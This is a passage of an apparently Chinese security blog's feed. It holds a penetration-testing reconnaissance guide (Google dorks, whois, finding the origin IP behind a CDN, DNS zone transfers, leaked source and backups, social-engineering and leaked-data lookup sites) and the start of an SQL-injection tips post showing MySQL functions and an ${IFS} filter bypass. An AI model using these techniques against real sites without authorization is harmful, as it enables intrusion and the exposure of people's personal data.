<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">intext: 把网页中的正文内容中的某个字符做为搜索条件;</div><div class="line">allintext:使用方法和intext类似;</div><div class="line">intitle: 搜索网页标题中是否有我们所要找的字符; </div><div class="line">cache: 搜索GOOGLE里关于某些内容的缓存,有时候往往能找到一些好东西. </div><div class="line">define: 搜索某个词的定义;</div><div class="line">filetype: 搜索制定类型的文件;</div><div class="line">info: 查找指定站点的一些基本信息;</div><div class="line">inurl: 搜索我们指定的字符是否存在于URL中.常用于查找通用漏洞、注入点、管理员登录的URL;</div><div class="line">allinurl:也同INURL类似,可指定多个字符;</div><div class="line">LINKURL: 例如搜索:INURL:HDU.EDU.CN可以返回所有和HDU.EDU.CN做了链接的URL;</div><div class="line">site: 搜索指定域名,用于搜集二级域名;</div><div class="line"></div><div class="line">一些连接符</div><div class="line"></div><div class="line">+ 把GOOGLE可能忽略的字列如查询范围 </div><div class="line">– 把某个字忽略 </div><div class="line">~ 同意词 </div><div class="line">. 单一的通配符 </div><div class="line">* 通配符，可代表多个字母 </div><div class="line">“” 精确查询</div></pre></td></tr></table></figure>
</li>
<li><p>Google域名<br>　　不同地区的 Google 搜索的不同，这种搜索引擎为了向大众提供方便根据不同的地域进行不同的优化。我们可以使用不同地区进行搜索，可能获取一些特别的信息。例如：<br>　　www.google.com.tw<br>　　www.google.com.hk<br>　　www.google.com.jp<br><strong>常见国际域名缩写</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">国际域名缩写	国家或地区	Countries and Regions</div><div class="line">CN	中国	China</div><div class="line">HK	香港特别行政区	Hongkong</div><div class="line">MO	澳门	Macao</div><div class="line">TW	台湾省	Taiwan</div><div class="line">KP	朝鲜	North Korea</div><div class="line">KR	韩国	Korea</div><div class="line">JP	日本	Japan</div><div class="line">RU	俄罗斯	Russia</div><div class="line">SG	新加坡	Singapore</div><div class="line">FR	法国	France</div><div class="line">CA	加拿大	Canada</div><div class="line">AU	澳大利亚	Australia</div><div class="line">US	美国	United States of America</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x02-whois查点"><a href="#0x02-whois查点" class="headerlink" title="0x02 whois查点"></a>0x02 whois查点</h2><p>　　whois信息包含了域名注册者的姓名、邮箱、电话、地址、DNS服务器等信息，对我们渗透目标以后后序的社工都很有用。</p>
<ul>
<li>KALI的whois查询<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/68826948.jpg" alt=""></li>
<li>在线查询：<br><a href="https://www.whois.com/" target="_blank" rel="external">https://www.whois.com/</a><br><a href="http://whois.chinaz.com/reverse/" target="_blank" rel="external">http://whois.chinaz.com/reverse/</a><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/30726785.jpg" alt=""></li>
<li>whois反查<br>利用注册人、邮箱、电话等进行whois反查，也可以搜集到一些意想不到的信息。<br><a href="http://whois.chinaz.com/reverse" target="_blank" rel="external">http://whois.chinaz.com/reverse</a></li>
</ul>
<h2 id="0x03-目标IP"><a href="#0x03-目标IP" class="headerlink" title="0x03 目标IP"></a>0x03 目标IP</h2><p>　　现在大部分网站都采用了CDN加速，其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定，为用户提供更流畅的服务。可是对于我们渗透测试人员来说，对判断目标IP带来阻碍。绕过CDN获取真实IP：</p>
<ul>
<li>判断：在不同地区ping网址<br><a href="http://ping.chinaz.com/" target="_blank" rel="external">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="external">http://ping.aizhan.com/</a><br><a href="http://tools.fastweb.com.cn/Index/Ping" target="_blank" rel="external">http://tools.fastweb.com.cn/Index/Ping</a><br>kaili下：dnsenum<br>eg：dnsenum -o /root/baidu.com -t 30 –threads 30 baidu.com</li>
<li>查找真实ip<br>1、二级域名法<br>　　一般网站不会所有的二级域名放CDN，可以使用谷歌语法site:xxxx.com查找二级域名，或者在线<a href="http://i.links.cn/subdomain/查找。" target="_blank" rel="external">http://i.links.cn/subdomain/查找。</a><br>　　确定没有使用CDN得二级域名之后，本地将目标域名绑定到同IP（修改hosts文件），如果目标网站还能访问说明目标网站与二级域名在同一服务器上；如果不在统一服务器也可能在同C段，扫描C段所有开放80端口IP。<br>2、nslookup<br>　　大部分CDN提供商只针对国内市场，而国外的市场几乎不做CDN，所以有机会解析到真实IP。所以可以使用国外的VPS ping目标网址，或者使用nslookup <a href="http://xxx.com" target="_blank" rel="external">http://xxx.com</a> 国外DNS，例如：nslookup www.baidu.com 8.8.8.8，国外DNS最好找一些冷门的提供商。<br>　　或者查询域名的NS记录，在域名记录中的MX记录，TXT记录等很有可能指向的是真实ip或同C段服务器。<br>3、ping<br>　　很多厂商只是把www.xxx.com做了CDN，我们可以使用ping <a href="http://www.xxx.com，或者使用国外多节点ping在线工具，例如[just-ping](http://www.just-ping.com" target="_blank" rel="external">http://www.xxx.com，或者使用国外多节点ping在线工具，例如[just-ping](http://www.just-ping.com</a>)<br>4、查看历史记录<br>　　查找域名历史解析记录，域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址<a href="http://toolbar.netcraft.com/site_report" target="_blank" rel="external">http://toolbar.netcraft.com/site_report</a><br>5、利用网站漏洞<br>XSS盲打、命令执行反弹shell、SSRF等<br>6、其他<br>RSS订阅：通过RSS订阅的方式，可以查找到订阅的消息中真实IP<br>订阅邮件：打开发来的邮件源码，可以看到服务器的真实IP，有时候会在同一网段，扫扫C段。<br>phpinfo：这个是最直接的，使用目录扫描，关键在于你的字典是否强大。</li>
</ul>
<h2 id="0x04-指纹识别"><a href="#0x04-指纹识别" class="headerlink" title="0x04 指纹识别"></a>0x04 指纹识别</h2><ul>
<li>whatweb<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/43361731.jpg" alt=""></li>
<li>Wappalyzer、Shodan、IP Whois &amp; Flags Chrome &amp; Websites Rating<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/9882144.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/35679591.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/63954749.jpg" alt=""></li>
<li>nmap<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/41569206.jpg" alt=""></li>
<li>TCP/IP属性：TTL、Window Size、DF<br>　　TTL：生存时间。指定数据报被路由器丢弃之前允许通过的网段数量。TTL 是由发送主机设置的，以防止数据包不断在 IP 互联网络上永不终止地循环。数据包在传送的时候至少会经过一个以上的路由器，当数据包经过一个路由器的时候，TTL就会自动减1，如果减到0了还是没有传送到目的主机，那么这个数据包就会自动丢失，这时路由器会发送一个ICMP报文给最初的发送者。<br><strong>ping直接查看TTL</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/59779587.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/30086518.jpg" alt=""><br>　　可以看到TTL为54，路由追踪发现经过10跳到达目的，很有可能是Liunx系统，虽然这种方法可能存在偏差。<br><strong>telent</strong><br>使用telent进行连接，使用Snort进行监听，查看三个属性，在siphon指纹数据库文件osprints.conf进行对比<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WINDOWS NT/2000   TTL：128</div><div class="line">WINDOWS 95/98     TTL：32</div><div class="line">UNIX              TTL：255</div><div class="line">LINUX             TTL：64</div><div class="line">WIN7          TTL：64</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x05-WAF检测"><a href="#0x05-WAF检测" class="headerlink" title="0x05 WAF检测"></a>0x05 WAF检测</h2><ul>
<li>WafW00f<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/9339095.jpg" alt=""></li>
<li>nmap<br>nmap www.baidu.com –script=http-waf-detect<br>或者–script=firewalk –traceroute、–script=http-waf-fingerprint<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/85651442.jpg" alt=""></li>
</ul>
<h2 id="0x06-端口扫描"><a href="#0x06-端口扫描" class="headerlink" title="0x06 端口扫描"></a>0x06 端口扫描</h2><p>老生常谈的端口扫描，以及常用方法大家也都明白。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/82233595.jpg" alt=""><br>nmap<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/40502374.jpg" alt=""></p>
<h2 id="0x07-DNS查询"><a href="#0x07-DNS查询" class="headerlink" title="0x07 DNS查询"></a>0x07 DNS查询</h2><p>　　DNS（域名系统）可以在侦查过程中提供有价值的数据，DNS的基本功能是将域名转换为IP地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">DNS记录：</div><div class="line">AAAA记录    IPv6 地址记录，记录一个域名对应的IPv6地址</div><div class="line">CNAME记录   别名记录，记录一个主机的别名</div><div class="line">MX记录    电子邮件交换记录，记录一个邮件域名对应的IP地址</div><div class="line">NS记录      域名服务器记录 ,记录该域名由哪台域名服务器解析</div><div class="line">PTR记录     反向记录，也即从IP地址到域名的一条记录</div><div class="line">TXT记录     记录域名的相关文本信息</div></pre></td></tr></table></figure></p>
<ul>
<li>host<br>host -t ns  www.baidu.com<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/88130402.jpg" alt=""></li>
<li>nslookup<br>Nslookup命令以两种方式运行:非交互式和交互式。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&gt; nslookup</div><div class="line">默认服务器:  UnKnown</div><div class="line">Address:  192.168.43.1</div><div class="line"></div><div class="line">&gt; ?</div><div class="line">命令:   (标识符以大写表示，[] 表示可选)</div><div class="line">set OPTION      - 设置选项</div><div class="line">    domain=NAME         - 将默认域名设置为 NAME</div><div class="line">    srchlist=N1[/N2/.../N6] - 将域设置为 N1，并将搜索列表设置为 N1、N2 等</div><div class="line">    root=NAME           - 将根服务器设置为 NAME</div><div class="line">    retry=X             - 将重试次数设置为 X</div><div class="line">    timeout=X           - 将初始超时间隔设置为 X 秒</div><div class="line">    type=X              - 设置查询类型(如 A、AAAA、A+AAAA、ANY、CNAME、MX、</div><div class="line">                          NS、PTR、SOA 和 SRV)</div><div class="line">ls [opt] DOMAIN [&gt; FILE] - 列出 DOMAIN 中的地址(可选: 输出到文件 FILE)</div><div class="line">    -a          -  列出规范名称和别名</div><div class="line">    -d          -  列出所有记录</div><div class="line">    -t TYPE     -  列出给定 RFC 记录类型(例如 A、CNAME、MX、NS 和 PTR 等)</div><div class="line">                   的记录</div><div class="line">exit            - 退出程序</div></pre></td></tr></table></figure>
<p>根据DNS查询，我们可以查找到DNS服务器、邮件服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&gt; nslookup</div><div class="line">默认服务器:  UnKnown</div><div class="line">Address:  192.168.43.1</div><div class="line">&gt; set type=mx</div><div class="line">&gt; baidu.com</div><div class="line">服务器:  UnKnown</div><div class="line">Address:  192.168.43.1</div><div class="line"></div><div class="line">非权威应答:</div><div class="line">baidu.com       MX preference = 20, mail exchanger = mx1.baidu.com</div><div class="line">baidu.com       MX preference = 10, mail exchanger = mx.n.shifen.com</div><div class="line">baidu.com       MX preference = 20, mail exchanger = jpmx.baidu.com</div><div class="line">baidu.com       MX preference = 20, mail exchanger = mx50.baidu.com</div><div class="line"></div><div class="line">baidu.com       nameserver = ns7.baidu.com</div><div class="line">baidu.com       nameserver = ns3.baidu.com</div><div class="line">baidu.com       nameserver = ns2.baidu.com</div><div class="line">baidu.com       nameserver = ns4.baidu.com</div><div class="line">baidu.com       nameserver = dns.baidu.com</div><div class="line">jpmx.baidu.com  internet address = 61.208.132.13</div><div class="line">dns.baidu.com   internet address = 202.108.22.220</div><div class="line">ns2.baidu.com   internet address = 61.135.165.235</div><div class="line">ns3.baidu.com   internet address = 220.181.37.10</div><div class="line">ns4.baidu.com   internet address = 220.181.38.10</div><div class="line">ns7.baidu.com   internet address = 180.76.76.92</div><div class="line">&gt; exit</div></pre></td></tr></table></figure></p>
<p>邮件在发送的过程:</p>
<p>1.发件人服务器需要先解析“收件人的域名”的MX主机<br>2.然后解析MX主机对应的IP<br>3.服务器通过连接对方的MX主机的25（邮件SMTP端口）发送邮件<br>4.用户通过客户端工具如OUTLOOK  foxmail软件连接收件人邮件服务器进行接收邮件<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-1/25287351.jpg" alt=""></p>
<h2 id="0x08-子域名查询"><a href="#0x08-子域名查询" class="headerlink" title="0x08 子域名查询"></a>0x08 子域名查询</h2><p>1、fierse工具：fierce -dns  www.baidu.com<br>2、在线查询：<a href="http://i.links.cn/subdomain/" target="_blank" rel="external">http://i.links.cn/subdomain/</a><br>3、谷歌语法：site: baidu.com/<br>4、subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="external">https://github.com/lijiejie/subDomainsBrute</a><br>5、DNS域传送漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; nslookup   输入nslookup命令进入交互式shell</div><div class="line">&gt; server DNS服务器   Server 命令参数设定查询将要使用的DNS服务器</div><div class="line">&gt; ls 域名   Ls命令列出某个域中的所有域名</div><div class="line">&gt; exit  Exit命令退出程序</div></pre></td></tr></table></figure></p>
<h2 id="0x09-源码泄露、敏感目录"><a href="#0x09-源码泄露、敏感目录" class="headerlink" title="0x09 源码泄露、敏感目录"></a>0x09 源码泄露、敏感目录</h2><ul>
<li><p>源码泄露<br>1、.git源码泄露<br>2、.DS_Store文件泄漏<br>3、SVN文件泄露<br>4、代码托管平台<br>5、网站备份压缩文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure>
</li>
<li><p>敏感目录<br>1、nikto<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/36784113.jpg" alt=""><br>2、dirb<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/71646913.jpg" alt=""><br>3、御剑目录扫描</p>
</li>
</ul>
<h2 id="0x10-旁注-C段"><a href="#0x10-旁注-C段" class="headerlink" title="0x10 旁注 C段"></a>0x10 旁注 C段</h2><p>　　旁注的意思就是从同台服务器上的其他网站入手，提权，然后把服务器拿下，就自然那个网站也就拿下了。C段嗅探，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务。<br>在线查询：<br><a href="http://www.webscan.cc/" target="_blank" rel="external">http://www.webscan.cc/</a><br><a href="http://dns.aizhan.com/" target="_blank" rel="external">http://dns.aizhan.com/</a><br><a href="http://www.secbox.cn/wp-content/uploads/2015/02/%E5%AE%89%E5%85%A8%E7%9B%92%E5%AD%90C%E6%AE%B5%E6%97%81%E6%B3%A8%E5%B7%A5%E5%85%B7%E7%AC%AC%E4%BA%8C%E7%89%88.rar" target="_blank" rel="external">安全盒子C段旁注工具</a></p>
<h2 id="0x11-社工"><a href="#0x11-社工" class="headerlink" title="0x11 社工"></a>0x11 社工</h2><p>QQ、QQ空间、微信朋友圈、微博、支付宝<br>Maltego：社工神器<br>社工库：<br><a href="http://s.70sec.com/" target="_blank" rel="external">http://s.70sec.com/</a><br>社交网站：<br><a href="http://twitter.com" target="_blank" rel="external">http://twitter.com</a><br><a href="http://facebook.com" target="_blank" rel="external">http://facebook.com</a><br>求职网站：<br><a href="http://linkedin.com" target="_blank" rel="external">http://linkedin.com</a><br><a href="http://plaxo.com" target="_blank" rel="external">http://plaxo.com</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　信息搜集是渗透目标的最重要的阶段，占据整个渗透测试的60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。&lt;/p&gt;
&lt;h2 id=&quot;0x01-搜索引擎&quot;&gt;&lt;a href=&quot;#0x01-搜索引擎&quot; class=&quot;headerlink&quot; title=&quot;0x01 搜索引擎&quot;&gt;&lt;/a&gt;0x01 搜索引擎&lt;/h2&gt;&lt;p&gt;Google、Bing、ZoomEye（钟馗之眼）、Shodan（撒旦）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Google hacking
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入技巧</title>
    <link href="https://zjw.dropsec.xyz/%E6%BC%8F%E6%B4%9E/2017/07/01/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html"/>
    <id>https://zjw.dropsec.xyz/漏洞/2017/07/01/SQL注入技巧.html</id>
    <published>2017-07-01T13:27:25.000Z</published>
    <updated>2017-08-24T02:31:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h3><p>1、连接符:mysql 空格，Oracle ||,sql server +<br>2、黑魔法${IFS}，Linux下可以使用其代替空格</p>
<a id="more"></a>
<h3 id="0x02-相关函数"><a href="#0x02-相关函数" class="headerlink" title="0x02 相关函数"></a>0x02 相关函数</h3><p>参考数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>mid()   从文本字段中提取字符</p>
</blockquote>
<p>SELECT MID(column_name,start[,length]) FROM table_name;<br>column_name    必需。要提取字符的字段。<br>start    必需。规定开始位置（起始值是 1）。<br>length    可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select mid(username,1,2) from users;</div><div class="line">+-------------------+</div><div class="line">| mid(username,1,2) |</div><div class="line">+-------------------+</div><div class="line">| Du                |</div><div class="line">| An                |</div><div class="line">| Du                |</div><div class="line">| se                |</div><div class="line">| st                |</div><div class="line">| su                |</div><div class="line">| ba                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| dh                |</div><div class="line">| ad                |</div><div class="line">+-------------------+</div><div class="line">mysql&gt; select mid(username,2) from users;</div><div class="line">+-----------------+</div><div class="line">| mid(username,2) |</div><div class="line">+-----------------+</div><div class="line">| umb             |</div><div class="line">| ngelina         |</div><div class="line">| ummy            |</div><div class="line">| ecure           |</div><div class="line">| tupid           |</div><div class="line">| uperman         |</div><div class="line">| atman           |</div><div class="line">| dmin            |</div><div class="line">| dmin1           |</div><div class="line">| dmin2           |</div><div class="line">| dmin3           |</div><div class="line">| hakkan          |</div><div class="line">| dmin4           |</div><div class="line">+-----------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>limit() 返回前几条或者中间某几行数据</p>
</blockquote>
<p>select * from table limit m,n    其m指记录始index0始表示第条记录 n指第m+1条始取n条<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users limit 1,2;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>concat与concat_ws与group_concat</p>
</blockquote>
<p>  MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat(&apos;123&apos;,null);</div><div class="line">+--------------------+</div><div class="line">| concat(&apos;123&apos;,null) |</div><div class="line">+--------------------+</div><div class="line">| NULL               |</div><div class="line">+--------------------+</div><div class="line">mysql&gt; select concat(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+---------------------+</div><div class="line">| concat(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+---------------------+</div><div class="line">| 123456              |</div><div class="line">+---------------------+</div></pre></td></tr></table></figure></p>
<p>和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,null);</div><div class="line">+-----------------------+</div><div class="line">| concat_ws(&apos;123&apos;,null) |</div><div class="line">+-----------------------+</div><div class="line">|                       |</div><div class="line">+-----------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+------------------------+</div><div class="line">| concat_ws(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+------------------------+</div><div class="line">| 456                    |</div><div class="line">+------------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;);</div><div class="line">+----------------------------+</div><div class="line">| concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+----------------------------+</div><div class="line">| 123.456                    |</div><div class="line">+----------------------------+</div></pre></td></tr></table></figure></p>
<p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from aa;  </div><div class="line">+------+------+</div><div class="line">| id| name |</div><div class="line">+------+------+</div><div class="line">|1 | 10|</div><div class="line">|1 | 20|</div><div class="line">|1 | 20|</div><div class="line">|2 | 20|</div><div class="line">|3 | 200 |</div><div class="line">|3 | 500 |</div><div class="line">+------+------+</div><div class="line">mysql&gt;select id,group_concat(name) from aa group by id;  </div><div class="line">+------+--------------------+</div><div class="line">| id| group_concat(name) |</div><div class="line">+------+--------------------+</div><div class="line">|1 | 10,20,20|</div><div class="line">|2 | 20 |</div><div class="line">|3 | 200,500|</div><div class="line">+------+--------------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>Count() 聚集函数，统计元祖的个数</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*) from users;</div><div class="line">+----------+</div><div class="line">| count(*) |</div><div class="line">+----------+</div><div class="line">|       13 |</div><div class="line">+----------+</div></pre></td></tr></table></figure>
<blockquote>
<p>rand() 用于产生一个0~1的随机数</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select rand(),rand();</div><div class="line">+---------------------+--------------------+</div><div class="line">| rand()              | rand()             |</div><div class="line">+---------------------+--------------------+</div><div class="line">| 0.37330908176797356 | 0.7865611089268337 |</div><div class="line">+---------------------+--------------------+</div><div class="line">mysql&gt; select * from users group by rand();</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">|  6 | superman | genious    |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>floor()   向下取整 </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select floor(123.456),floor(-123.456);</div><div class="line">+----------------+-----------------+</div><div class="line">| floor(123.456) | floor(-123.456) |</div><div class="line">+----------------+-----------------+</div><div class="line">|            123 |            -124 |</div><div class="line">+----------------+-----------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>group by 依据我们想要的规则对结果进行分组</p>
</blockquote>
